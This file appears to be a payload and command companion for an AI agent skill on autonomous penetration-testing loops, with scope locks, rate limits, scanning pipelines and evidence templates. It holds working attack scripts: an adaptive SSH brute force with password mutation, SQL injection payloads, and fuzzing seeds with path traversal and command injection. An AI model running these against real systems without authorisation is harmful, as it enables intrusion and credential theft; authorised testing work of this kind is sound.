# Autonomous Loops — Payloads & Commands

> Companion to `SKILL.md`. Contains command templates, configuration templates, and operational payloads organized by loop pattern. For structured test scenarios, see `test-cases.md`. For the deep-dive guide on safe autonomous operations, see `guides/safe-autonomous-pentest.md`.

---

## Index

1. [Scope Lock Templates](#1-scope-lock-templates)
2. [Rate Limiting Configurations](#2-rate-limiting-configurations)
3. [Sequential Pipeline Commands](#3-sequential-pipeline-commands)
4. [Watch Loop Commands](#4-watch-loop-commands)
5. [Batch Processing Commands](#5-batch-processing-commands)
6. [Learning Cycle Commands](#6-learning-cycle-commands)
7. [Error Handling Response Templates](#7-error-handling-response-templates)
8. [Evidence Log Templates](#8-evidence-log-templates)

---

## 1. Scope Lock Templates

### Scope Lock: Sequential Pipeline

```markdown
## Scope Lock: Subnet Enumeration Pipeline
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Sequential Pipeline
- **Allowed targets**: 192.168.1.0/24 (254 hosts, .1 router excluded)
- **Allowed operations**: nmap SYN scan, banner grabbing, service version detection
- **Forbidden operations**: Exploit attempts, credential brute force, DoS techniques
- **Time limit**: 120 minutes wall-clock
- **Iteration limit**: 254 hosts maximum
- **Abort conditions**: IDS alert detected, target crash, scope deviation, operator manual stop
- **Operator notification**: Every 50 hosts or 15 minutes
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Watch Loop

```markdown
## Scope Lock: Service Availability Monitor
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Watch Loop
- **Allowed targets**: 192.168.1.100:80, 192.168.1.100:443, 192.168.1.100:22
- **Allowed operations**: TCP connect check, HTTP HEAD request, banner grab
- **Forbidden operations**: Vulnerability scanning, exploitation, modification of any service
- **Time limit**: 60 minutes wall-clock
- **Iteration limit**: 720 iterations (5-second polling interval)
- **Polling interval**: 5 seconds minimum
- **Abort conditions**: Target unreachable for 3 consecutive polls, operator manual stop
- **Trigger condition**: New service detected on any non-monitored port, or service state change
- **Operator notification**: On trigger event, every 100 iterations, on abort
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Batch Processing

```markdown
## Scope Lock: Mass Vulnerability Scan
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Batch Processing
- **Allowed targets**: targets.txt (pre-verified list, 50 hosts maximum)
- **Allowed operations**: nmap version scan, nikto web scan, SSL certificate check
- **Forbidden operations**: Active exploitation, denial of service, credential attacks
- **Time limit**: 180 minutes wall-clock
- **Iteration limit**: 50 hosts in batches of 5
- **Concurrency**: Maximum 5 simultaneous operations
- **Rate limit**: 2-second delay between batches
- **Abort conditions**: IDS alert, target crash, unexpected service disruption, operator manual stop
- **Operator notification**: Every 10 hosts completed, on any error, on completion
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Learning Cycle

```markdown
## Scope Lock: Adaptive SQL Injection Testing
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Learning Cycle
- **Allowed targets**: http://target.example.com/search?q= (single endpoint)
- **Allowed operations**: HTTP GET/POST with SQLi payloads, response analysis
- **Forbidden operations**: Modification of database content, admin access attempts, lateral movement
- **Time limit**: 30 minutes wall-clock
- **Iteration limit**: 50 payload variations maximum
- **Confidence threshold**: Abort if confidence < 10% after 10 attempts
- **Abort conditions**: WAF ban detected (HTTP 403/429), target error 500, operator manual stop
- **Refinement scope**: Payload variations only — NEVER widen target scope
- **Operator notification**: Every 10 iterations, on confidence threshold breach, on success
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

---

## 2. Rate Limiting Configurations

### Per-Operation Rate Profiles

```yaml
# Copy-paste rate limiting configuration for autonomous loops

network_scan:
  tool: nmap
  min_interval: "2s between hosts"
  max_concurrency: 5
  batch_delay: "3s between batches"
  retry_on_failure: true
  max_retries: 1
  backoff_multiplier: 2

web_request:
  tool: curl/httpx/nikto
  min_interval: "100ms between requests per target"
  max_concurrency: 3
  batch_delay: "1s between batches"
  retry_on_failure: false
  respect_retry_after: true
  backoff_multiplier: 2

dns_lookup:
  tool: dig/host/dnsrecon
  min_interval: "50ms between queries"
  max_concurrency: 10
  batch_delay: "500ms between batches"
  retry_on_failure: true
  max_retries: 2
  backoff_multiplier: 1.5

brute_force:
  tool: hydra/medusa
  min_interval: "500ms between attempts"
  max_concurrency: 1
  batch_delay: "1s between batches"
  retry_on_failure: false
  lockout_detection: true
  backoff_multiplier: 3

exploit_attempt:
  tool: msf/manual
  min_interval: "5s between attempts"
  max_concurrency: 1
  batch_delay: "10s between batches"
  retry_on_failure: false
  require_manual_approval: true
  backoff_multiplier: 5
```

### Adaptive Rate Limit Override

```bash
# When rate limit is detected, apply adaptive backoff
# Usage: ./rate_backoff.sh <base_delay> <multiplier> <max_delay>

BASE_DELAY=${1:-2}
MULTIPLIER=${2:-2}
MAX_DELAY=${3:-60}
CURRENT_DELAY=$BASE_DELAY

adaptive_wait() {
  echo "[RATE-LIMIT] Backing off: ${CURRENT_DELAY}s"
  sleep "$CURRENT_DELAY"
  CURRENT_DELAY=$((CURRENT_DELAY * MULTIPLIER))
  if [ "$CURRENT_DELAY" -gt "$MAX_DELAY" ]; then
    CURRENT_DELAY=$MAX_DELAY
  fi
}

reset_delay() {
  CURRENT_DELAY=$BASE_DELAY
}
```

---

## 3. Sequential Pipeline Commands

### Target List Processing

```bash
# Process a list of targets sequentially with scope check
# Scope: Read target list, validate against scope lock, execute one at a time

TARGET_LIST="targets.txt"
SCOPE_CIDR="192.168.1.0/24"
LOG_FILE="evidence/pipeline-$(date +%Y%m%d-%H%M%S).log"

mkdir -p evidence/

while IFS= read -r target; do
  # Scope check: verify target is within allowed range
  if prips "$SCOPE_CIDR" | grep -q "^${target}$"; then
    echo "[$(date -Iseconds)] [IN-SCOPE] $target" | tee -a "$LOG_FILE"
    # -- execute operation here --
  else
    echo "[$(date -Iseconds)] [OUT-OF-SCOPE] $target — SKIPPED" | tee -a "$LOG_FILE"
    continue
  fi
  # Rate limit
  sleep 2
done < "$TARGET_LIST"
```

### Port Scan Pipeline

```bash
# Sequential port scan across subnet — one host at a time
# Rate: 2s between hosts, max 254 targets

SUBNET="192.168.1.0/24"
OUTPUT_DIR="evidence/portscan-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[PIPELINE-START] Port scan pipeline: $SUBNET at $(date -Iseconds)"

for host in $(nmap -sn -n "$SUBNET" -oG - | awk '/Up$/{print $2}'); do
  echo "[ITERATION] Scanning $host"
  nmap -sV -T4 -p- --version-intensity 5 -oA "$OUTPUT_DIR/host-${host}" "$host" 2>&1 | tee -a "$OUTPUT_DIR/pipeline.log"

  # Rate limit between hosts
  sleep 2
done

echo "[PIPELINE-END] Completed at $(date -Iseconds)"
```

### Web Directory Enumeration Pipeline

```bash
# Sequential directory enumeration across multiple web targets
# Rate: 100ms between requests per target, 3s between targets

TARGETS=("http://target1.local" "http://target2.local" "http://target3.local")
WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
OUTPUT_DIR="evidence/webdir-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

for target in "${TARGETS[@]}"; do
  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9]|-|g')
  echo "[ITERATION] Enumerating $target"

  gobuster dir -u "$target" -w "$WORDLIST" -t 3 -q 2>&1 \
    | tee "$OUTPUT_DIR/dir-${SAFE_NAME}.txt"

  # Rate limit between targets
  sleep 3
done
```

### Service Enumeration Pipeline

```bash
# Sequential service enumeration from nmap results
# Parse XML output, enumerate each discovered service

NMAP_XML="evidence/portscan-hosts.xml"
OUTPUT_DIR="evidence/service-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# Extract open ports and services
hosts_ports=$(nmap_parser.py "$NMAP_XML" --format "host:port:service" 2>/dev/null || \
  xmlstarlet sel -T -t -m "//host/address[@addrtype='ipv4']" -v "@addr" -o ":" \
    -m "../ports/port[state/@state='open']" -v "@portid" -o ":" -v "service/@name" -n "$NMAP_XML")

echo "$hosts_ports" | while IFS=: read -r host port service; do
  [ -z "$host" ] && continue
  echo "[ITERATION] Enumerating $service on $host:$port"

  case "$service" in
    http|https)
      nikto -h "http://${host}:${port}" -output "$OUTPUT_DIR/nikto-${host}-${port}.xml" 2>&1 | tail -5
      ;;
    smb|microsoft-ds)
      enum4linux -a "$host" > "$OUTPUT_DIR/smb-${host}.txt" 2>&1
      ;;
    ssh)
      ssh-audit "$host" > "$OUTPUT_DIR/ssh-${host}.txt" 2>&1
      ;;
    *)
      echo "[SKIP] No enumerator for service: $service"
      ;;
  esac

  sleep 2
done
```

---

## 4. Watch Loop Commands

### Service Monitoring

```bash
# Watch a set of ports for state changes (open/closed/filtered)
# Polling: 5s minimum interval, max 1000 iterations

TARGET="192.168.1.100"
PORTS=(22 80 443 3306 8080)
MAX_ITER=1000
POLL_INTERVAL=5
BASELINE_FILE="evidence/baseline-ports.txt"
ITER=0

echo "[WATCH-START] Monitoring $TARGET ports: ${PORTS[*]}"

# Capture baseline
for port in "${PORTS[@]}"; do
  timeout 3 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "$port:OPEN" || echo "$port:CLOSED"
done > "$BASELINE_FILE"

while [ "$ITER" -lt "$MAX_ITER" ]; do
  ITER=$((ITER + 1))
  for port in "${PORTS[@]}"; do
    current_state=$(timeout 3 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "OPEN" || echo "CLOSED")
    baseline_state=$(grep "^${port}:" "$BASELINE_FILE" | cut -d: -f2)

    if [ "$current_state" != "$baseline_state" ]; then
      echo "[$(date -Iseconds)] [TRIGGER] Port $port changed: $baseline_state -> $current_state"
      echo "$port:$current_state" >> "evidence/watch-events-$(date +%Y%m%d).log"
      # Update baseline
      sed -i "s/^${port}:.*/${port}:${current_state}/" "$BASELINE_FILE"
    fi
  done

  sleep "$POLL_INTERVAL"
done

echo "[WATCH-END] Max iterations reached after $ITER cycles"
```

### Port Change Detection

```bash
# Monitor for new open ports using nmap diff
# Polling: 10s interval, max 500 iterations

TARGET="192.168.1.100"
PREV_SCAN=""

for i in $(seq 1 500); do
  CURRENT_SCAN=$(nmap -T4 -F -n "$TARGET" 2>/dev/null | grep "^[0-9]" | sort)

  if [ -n "$PREV_SCAN" ] && [ "$CURRENT_SCAN" != "$PREV_SCAN" ]; then
    echo "[$(date -Iseconds)] [CHANGE-DETECTED] Port scan diff:"
    diff <(echo "$PREV_SCAN") <(echo "$CURRENT_SCAN") | tee -a "evidence/port-diff-$(date +%Y%m%d).log"
  fi

  PREV_SCAN="$CURRENT_SCAN"
  sleep 10
done
```

### Log Watching

```bash
# Watch a web server log for specific patterns
# Trigger: new 200 response on admin endpoint

LOG_FILE="/var/log/apache2/access.log"
PATTERN="admin.*HTTP.*200"
LAST_LINE=0
MAX_ITER=1000
POLL_INTERVAL=5

for i in $(seq 1 "$MAX_ITER"); do
  CURRENT_LINES=$(wc -l < "$LOG_FILE")

  if [ "$CURRENT_LINES" -gt "$LAST_LINE" ]; then
    NEW_MATCHES=$(tail -n +"$((LAST_LINE + 1))" "$LOG_FILE" | grep -c "$PATTERN" || true)
    if [ "$NEW_MATCHES" -gt 0 ]; then
      echo "[$(date -Iseconds)] [TRIGGER] $NEW_MATCHES new matches for pattern: $PATTERN"
      tail -n +"$((LAST_LINE + 1))" "$LOG_FILE" | grep "$PATTERN" | tee -a "evidence/logwatch-$(date +%Y%m%d).log"
    fi
  fi

  LAST_LINE=$CURRENT_LINES
  sleep "$POLL_INTERVAL"
done
```

### New Endpoint Detection

```bash
# Periodically check for new web endpoints using HTTP response diff
# Trigger: new HTTP 200 response on previously unknown path

TARGET="http://target.local"
PATHS=("/admin" "/backup" "/api" "/console" "/debug" "/test" "/.env")
PREV_RESULTS=""
MAX_ITER=500
POLL_INTERVAL=10

for i in $(seq 1 "$MAX_ITER"); do
  CURRENT_RESULTS=""
  for path in "${PATHS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}" 2>/dev/null || echo "000")
    CURRENT_RESULTS="${CURRENT_RESULTS}${path}:${STATUS}\n"
  done

  if [ -n "$PREV_RESULTS" ] && [ "$CURRENT_RESULTS" != "$PREV_RESULTS" ]; then
    echo "[$(date -Iseconds)] [TRIGGER] Endpoint status change detected"
    diff <(echo -e "$PREV_RESULTS") <(echo -e "$CURRENT_RESULTS") | tee -a "evidence/endpoint-watch-$(date +%Y%m%d).log"
  fi

  PREV_RESULTS="$CURRENT_RESULTS"
  sleep "$POLL_INTERVAL"
done
```

---

## 5. Batch Processing Commands

### Mass DNS Lookup

```bash
# Batch DNS lookup with concurrency limit of 10
# Rate: 50ms between queries within batch, 500ms between batches

DOMAINS_FILE="domains.txt"
OUTPUT_FILE="evidence/dns-batch-$(date +%Y%m%d-%H%M%S).txt"
BATCH_SIZE=10
BATCH_DELAY=0.5

echo "[BATCH-START] DNS lookup: $DOMAINS_FILE at $(date -Iseconds)"

TOTAL=$(wc -l < "$DOMAINS_FILE")
PROCESSED=0

while IFS= read -r domain; do
  dig +short "$domain" A &
  dig +short "$domain" MX &
  dig +short "$domain" TXT &

  PROCESSED=$((PROCESSED + 1))

  if [ $((PROCESSED % BATCH_SIZE)) -eq 0 ]; then
    wait
    echo "[BATCH] Processed $PROCESSED / $TOTAL domains"
    sleep "$BATCH_DELAY"
  fi
done < "$DOMAINS_FILE"

wait
echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch HTTP Header Check

```bash
# Batch security header analysis with concurrency limit of 3
# Rate: 100ms between requests, 1s between batches

TARGETS_FILE="urls.txt"
OUTPUT_DIR="evidence/headers-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=3
BATCH_DELAY=1

echo "[BATCH-START] HTTP header analysis at $(date -Iseconds)"

httpx -l "$TARGETS_FILE" -status-code -content-length -title \
  -tech-detect -follow-redirects -threads "$CONCURRENCY" \
  -o "$OUTPUT_DIR/httpx-results.txt"

# Security header analysis per target
while IFS= read -r url; do
  SAFE_NAME=$(echo "$url" | sed 's|[^a-zA-Z0-9]|-|g')
  curl -sI "$url" > "$OUTPUT_DIR/headers-${SAFE_NAME}.txt"
  sleep 0.1
done < "$TARGETS_FILE"

echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch Vulnerability Scan

```bash
# Batch vulnerability scan using nmap vuln category scripts
# Concurrency: 5 hosts at a time, 3s between batches

TARGETS_FILE="targets.txt"
OUTPUT_DIR="evidence/vulnscan-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=5
BATCH_DELAY=3

echo "[BATCH-START] Vulnerability scan at $(date -Iseconds)"

# Split targets into batches
split -l "$CONCURRENCY" "$TARGETS_FILE" "$OUTPUT_DIR/batch-"

BATCH_NUM=0
for batch_file in "$OUTPUT_DIR"/batch-*; do
  BATCH_NUM=$((BATCH_NUM + 1))
  echo "[BATCH] Running batch $BATCH_NUM"

  while IFS= read -r target; do
    nmap --script vuln -T4 -sV -oA "$OUTPUT_DIR/vuln-${target}" "$target" &
  done < "$batch_file"

  wait
  sleep "$BATCH_DELAY"
done

# Clean up batch files
rm -f "$OUTPUT_DIR"/batch-*

echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch Nikto Scan

```bash
# Batch Nikto web vulnerability scan with concurrency limit of 3
# Rate: 2s between scans

TARGETS_FILE="web_targets.txt"
OUTPUT_DIR="evidence/nikto-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=3
BATCH_DELAY=2
COUNT=0

echo "[BATCH-START] Nikto scan at $(date -Iseconds)"

while IFS= read -r target; do
  COUNT=$((COUNT + 1))
  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9]|-|g')
  nikto -h "$target" -o "$OUTPUT_DIR/nikto-${SAFE_NAME}.xml" -Format xml &
  sleep 0.5

  if [ $((COUNT % CONCURRENCY)) -eq 0 ]; then
    wait
    echo "[BATCH] Completed $COUNT targets"
    sleep "$BATCH_DELAY"
  fi
done < "$TARGETS_FILE"

wait
echo "[BATCH-END] $COUNT targets scanned at $(date -Iseconds)"
```

---

## 6. Learning Cycle Commands

### Adaptive Brute Force

```bash
# Adaptive SSH brute force with wordlist refinement
# Max 50 iterations, confidence threshold 10% after 10 attempts

TARGET="192.168.1.100"
USER_LIST="users.txt"
BASE_WORDLIST="passwords-base.txt"
MUTATED_WORDLIST="passwords-mutated.txt"
LOG_FILE="evidence/adaptive-bruteforce-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50
CONFIDENCE_THRESHOLD=0.1
MIN_DATA_ITER=10

ITER=0
ATTEMPTS=0
SUCCESSES=0

# Phase 1: Base wordlist
echo "[LEARN-START] Phase 1: Base wordlist at $(date -Iseconds)"
while IFS= read -r user; do
  while IFS= read -r pass; do
    ITER=$((ITER + 1))
    ATTEMPTS=$((ATTEMPTS + 1))

    result=$(hydra -l "$user" -p "$pass" -t 1 -W 1 ssh://"$TARGET" 2>&1)
    echo "[$(date -Iseconds)] [ITER-$ITER] $user:$pass -> $(echo "$result" | tail -1)" | tee -a "$LOG_FILE"

    if echo "$result" | grep -q "login:"; then
      SUCCESSES=$((SUCCESSES + 1))
      echo "[$(date -Iseconds)] [SUCCESS] $user:$pass" | tee -a "$LOG_FILE"
    fi

    if [ "$ITER" -ge "$MAX_ITER" ]; then
      echo "[LEARN-END] Max iterations reached" | tee -a "$LOG_FILE"
      exit 0
    fi

    sleep 0.5
  done < "$BASE_WORDLIST"
done < "$USER_LIST"

# Phase 2: Mutate wordlist based on results (if confidence too low)
CONFIDENCE=$(echo "scale=4; $SUCCESSES / $ATTEMPTS" | bc 2>/dev/null || echo "0")
if [ "$(echo "$CONFIDENCE < $CONFIDENCE_THRESHOLD" | bc 2>/dev/null)" -eq 1 ]; then
  echo "[LEARN] Confidence ($CONFIDENCE) below threshold. Mutating wordlist..." | tee -a "$LOG_FILE"
  # Generate mutations: capitalize, append numbers, leet speak
  while IFS= read -r word; do
    echo "$word"
    echo "${word}123"
    echo "${word}!"
    echo "$(echo "$word" | sed 's/a/4/g;s/e/3/g;s/i/1/g;s/o/0/g')"
    echo "$(echo "$word" | sed 's/.*/\u&/')"
  done < "$BASE_WORDLIST" > "$MUTATED_WORDLIST"
fi
```

### SQLi Payload Refinement

```bash
# Iterative SQLi payload testing with feedback-based refinement
# Max 50 iterations, abort on WAF detection

TARGET_URL="http://target.local/search?q="
BASE_PAYLOADS=(
  "'" "' OR 1=1--" "' OR '1'='1" "\" OR \"1\"=\"1"
  "1' UNION SELECT NULL--" "1' UNION SELECT NULL,NULL--"
)
LOG_FILE="evidence/sqli-refine-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50

ITER=0
for payload in "${BASE_PAYLOADS[@]}"; do
  ITER=$((ITER + 1))
  [ "$ITER" -gt "$MAX_ITER" ] && break

  response=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")" 2>/dev/null)
  body=$(curl -s "${TARGET_URL}$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")" 2>/dev/null | head -c 500)

  echo "[$(date -Iseconds)] [ITER-$ITER] Payload: ${payload} -> HTTP ${response}" | tee -a "$LOG_FILE"

  # WAF detection
  if [ "$response" = "403" ] || [ "$response" = "429" ]; then
    echo "[ABORT] WAF detected (HTTP $response). Stopping." | tee -a "$LOG_FILE"
    break
  fi

  # Success indicators
  if echo "$body" | grep -qiE "sql|mysql|syntax|error|query"; then
    echo "[LEARN] SQL error detected — refining payload for extraction" | tee -a "$LOG_FILE"
    # Next iteration would use refined payloads based on this feedback
  fi

  sleep 0.5
done
```

### Fuzzing with Feedback

```bash
# Fuzz an HTTP parameter with iterative payload generation
# Feedback loop: analyze response length and status to guide next payloads

TARGET="http://target.local/api/user"
PARAM="id"
LOG_FILE="evidence/fuzz-feedback-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50

# Seed payloads
PAYLOADS=(1 2 3 100 -1 0 999999 "a" "'" "\"" "../../../etc/passwd" "$(sleep 5)")

ITER=0
BASELINE_LENGTH=""

for payload in "${PAYLOADS[@]}"; do
  ITER=$((ITER + 1))
  [ "$ITER" -gt "$MAX_ITER" ] && break

  response=$(curl -s -w "\n%{http_code} %{size_download}" "${TARGET}?${PARAM}=${payload}" 2>/dev/null)
  http_code=$(echo "$response" | tail -1 | awk '{print $1}')
  body_length=$(echo "$response" | tail -1 | awk '{print $2}')
  body=$(echo "$response" | sed '$d')

  if [ -z "$BASELINE_LENGTH" ]; then
    BASELINE_LENGTH=$body_length
  fi

  echo "[$(date -Iseconds)] [ITER-$ITER] ${PARAM}=${payload} -> HTTP ${http_code}, Length: ${body_length} (baseline: ${BASELINE_LENGTH})" | tee -a "$LOG_FILE"

  # Anomaly: response length significantly different from baseline
  if [ -n "$BASELINE_LENGTH" ] && [ "$body_length" != "$BASELINE_LENGTH" ]; then
    diff=$((body_length - BASELINE_LENGTH))
    if [ "${diff#-}" -gt 100 ]; then
      echo "[LEARN] Significant response deviation (${diff} bytes). Flagging for investigation." | tee -a "$LOG_FILE"
    fi
  fi

  sleep 0.1
done
```

### Password List Mutation

```bash
# Generate mutated password lists from base words using common transformation rules
# Used by Learning Cycle to expand search space after base list exhaustion

BASE_LIST="passwords-base.txt"
OUTPUT="passwords-mutated-$(date +%Y%m%d-%H%M%S).txt"

echo "[LEARN] Generating mutations from $BASE_LIST"

while IFS= read -r word; do
  # Original
  echo "$word"
  # Capitalize first letter
  echo "$word" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}'
  # All uppercase
  echo "$word" | tr '[:lower:]' '[:upper:]'
  # Append common suffixes
  for suffix in "!" "@123" "#1" "2024" "2025" "2026" "." "!!" "1234" "12345"; do
    echo "${word}${suffix}"
    echo "$(echo "$word" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')${suffix}"
  done
  # Leet speak
  echo "$word" | sed 's/a/4/g;s/e/3/g;s/i/1/g;s/o/0/g;s/s/5/g;s/t/7/g'
  # Reverse
  echo "$word" | rev
  # Double
  echo "${word}${word}"
done < "$BASE_LIST" | sort -u > "$OUTPUT"

echo "[LEARN] Mutated list: $(wc -l < "$OUTPUT") unique entries saved to $OUTPUT"
```

---

## 7. Error Handling Response Templates

### Pre-Formatted Error Log Entries

```markdown
### Target Unreachable
[ERROR-UNREACHABLE] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: SKIP | Iteration: {N}/{MAX}
Response: Connection refused or timed out after 3 attempts
Decision: Logged and skipped, continuing to next target
Impact: Target excluded from results; may need manual investigation

### Rate Limit Detected
[ERROR-RATELIMIT] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: BACKOFF | Iteration: {N}/{MAX}
Response: HTTP 429 / connection throttled
Decision: Increasing delay from {CURRENT_DELAY}s to {NEW_DELAY}s, single retry
Impact: Slower execution; if retry fails, target logged as rate-limited

### WAF/IPS Detected
[ERROR-WAF] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: ABORT | Iteration: {N}/{MAX}
Response: HTTP 403 Forbidden / connection reset / pattern blocked
Decision: STOPPING loop immediately. All subsequent payloads would be blocked.
Impact: Loop terminated; remaining iterations not executed; operator notified

### IDS Alert Detected
[ERROR-IDS] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: IDS signature match detected or target firewall behavior changed
Decision: EMERGENCY STOP. All operations halted. Evidence preserved.
Impact: Immediate loop termination; full evidence chain preserved; operator alert sent

### Target Crash / Unexpected Downtime
[ERROR-CRASH] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: Target became unreachable mid-operation (was reachable previously)
Decision: EMERGENCY STOP. Possible target instability from testing.
Impact: Loop terminated; last known-good state logged; operator must verify target health

### Scope Violation
[ERROR-SCOPE] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: STOP | Iteration: {N}/{MAX}
Response: Operation attempted outside of scope lock boundaries
Decision: EMERGENCY STOP. Scope violation is a hard boundary.
Impact: Loop terminated; incident logged; operator must review and approve before resuming

### Unexpected Service Response
[ERROR-UNEXPECTED] {ISO_8601_TIMESTAMP} | Target: {TARGET} | Action: FLAG | Iteration: {N}/{MAX}
Response: Service returned unexpected data format or status code
Decision: Logged with full details, flagged for manual review, continuing pipeline
Impact: Target flagged in results for manual investigation; does not block pipeline
```

---

## 8. Evidence Log Templates

### Loop-Level Evidence Header

```markdown
# Loop Evidence Log: {OPERATION_ID}

## Operation Summary
- **Pattern**: {Sequential Pipeline | Watch Loop | Batch Processing | Learning Cycle}
- **Scope Lock**: Defined at {ISO_8601_TIMESTAMP}, locked for duration
- **Start Time**: {ISO_8601_TIMESTAMP}
- **End Time**: {ISO_8601_TIMESTAMP}
- **Duration**: {minutes} minutes
- **Total Iterations**: {N} / {MAX}
- **Targets Processed**: {X} successful, {Y} skipped, {Z} errors
- **Status**: {COMPLETED | ABORTED | STOPPED}

## Scope Lock Reference
- **Allowed Targets**: {SCOPE_TARGETS}
- **Allowed Operations**: {SCOPE_OPERATIONS}
- **Violations**: {NONE | LIST_ANY}

## Results Summary
- **Findings**: {COUNT} findings of interest
- **Errors**: {COUNT} errors encountered
- **Skipped**: {COUNT} targets/iterations skipped

---
```

### Iteration-Level Evidence Entry

```markdown
### Entry {N}: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Iteration** | {N} / {MAX} |
| **Target** | {HOST}:{PORT} or {URL} |
| **Action** | {COMMAND or TECHNIQUE} |
| **Result** | {SUCCESS \| FAIL \| ERROR \| TIMEOUT \| SKIP} |
| **Output** | {Truncated to 500 chars; full output at {PATH}} |
| **State Change** | {NONE or DESCRIPTION} |
| **Duration** | {seconds}s |
| **Notes** | {ANY_ADDITIONAL_OBSERVATIONS} |

---
```

### Batch Evidence Summary

```markdown
### Batch {N} Results

| Target | Action | Status | Key Finding | Duration |
|--------|--------|--------|-------------|----------|
| {HOST1} | {ACTION} | {STATUS} | {FINDING} | {TIME} |
| {HOST2} | {ACTION} | {STATUS} | {FINDING} | {TIME} |
| {HOST3} | {ACTION} | {STATUS} | {FINDING} | {TIME} |

**Batch Duration**: {seconds}s
**Rate Limit Delay**: {seconds}s between batches
**Next Batch**: {N+1} in {seconds}s

---
```

### Watch Loop Trigger Evidence

```markdown
### Trigger Event: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Watch Target** | {TARGET} |
| **Iteration** | {N} / {MAX} |
| **Polling Interval** | {seconds}s |
| **Trigger Condition** | {CONDITION_DESCRIPTION} |
| **Previous State** | {STATE} |
| **Current State** | {STATE} |
| **Action Taken** | {RESPONSE_ACTION} |
| **Action Result** | {SUCCESS \| FAIL} |
| **One-Shot** | {YES \| NO} |

---
```

### Learning Cycle Evidence

```markdown
### Learning Iteration {N}: {ISO_8601_TIMESTAMP}

| Field | Value |
|-------|-------|
| **Approach** | {CURRENT_APPROACH_DESCRIPTION} |
| **Payload/Technique** | {SPECIFIC_PAYLOAD} |
| **Result** | {SUCCESS \| FAIL \| PARTIAL} |
| **Analysis** | {WHAT_WAS_LEARNED} |
| **Confidence** | {PERCENT}% |
| **Next Approach** | {REFINED_APPROACH} |
| **Abort Reason** | {NONE \| CONFIDENCE_LOW \| MAX_ITER \| SUCCESS} |

---
```
